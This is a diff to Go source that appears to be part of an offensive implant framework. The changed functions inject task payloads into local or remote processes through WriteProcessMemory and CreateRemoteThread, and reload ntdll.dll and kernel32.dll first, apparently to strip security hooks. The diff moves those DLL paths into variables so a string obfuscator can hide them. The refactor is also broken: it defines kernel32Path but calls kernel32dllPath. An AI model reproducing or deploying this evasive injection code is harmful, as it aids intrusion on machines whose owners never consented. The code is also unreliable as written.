@@ -34,6 +34,9 @@ var (
 	procWriteProcessMemory = kernel32.MustFindProc("WriteProcessMemory")
 	procCreateRemoteThread = kernel32.MustFindProc("CreateRemoteThread")
 	procCreateThread       = kernel32.MustFindProc("CreateThread")
+
+	ntdllPath    = "C:\\Windows\\System32\\ntdll.dll" // We make this a var so the string obfuscator can refactor it
+	kernel32Path = "C:\\Windows\\System32\\kernel32.dll"
 )
 
 func virtualAllocEx(process syscall.Handle, addr uintptr, size, allocType, protect uint32) (uintptr, error) {
@@ -223,11 +226,11 @@ func injectTask(processHandle syscall.Handle, data []byte) error {
 
 // RermoteTask - Injects Task into a processID using remote threads
 func RemoteTask(processID int, data []byte) error {
-	err := RefreshPE(`c:\windows\system32\ntdll.dll`)
+	err := RefreshPE(ntdllPath)
 	if err != nil {
 		return err
 	}
-	err = RefreshPE(`c:\windows\system32\kernel32.dll`)
+	err = RefreshPE(kernel32dllPath)
 	if err != nil {
 		return err
 	}
@@ -243,11 +246,11 @@ func RemoteTask(processID int, data []byte) error {
 }
 
 func LocalTask(data []byte) error {
-	err := RefreshPE(`c:\windows\system32\ntdll.dll`)
+	err := RefreshPE(ntdllPath)
 	if err != nil {
 		return err
 	}
-	err = RefreshPE(`c:\windows\system32\kernel32.dll`)
+	err = RefreshPE(kernel32dllPath)
 	if err != nil {
 		return err
 	}
@@ -265,11 +268,11 @@ func LocalTask(data []byte) error {
 }
 
 func ExecuteAssembly(hostingDll, assembly []byte, params string, timeout int32) (string, error) {
-	err := RefreshPE(`c:\windows\system32\ntdll.dll`)
+	err := RefreshPE(ntdllPath)
 	if err != nil {
 		return "", err
 	}
-	err = RefreshPE(`c:\windows\system32\kernel32.dll`)
+	err = RefreshPE(kernel32dllPath)
 	if err != nil {
 		return "", err
 	}
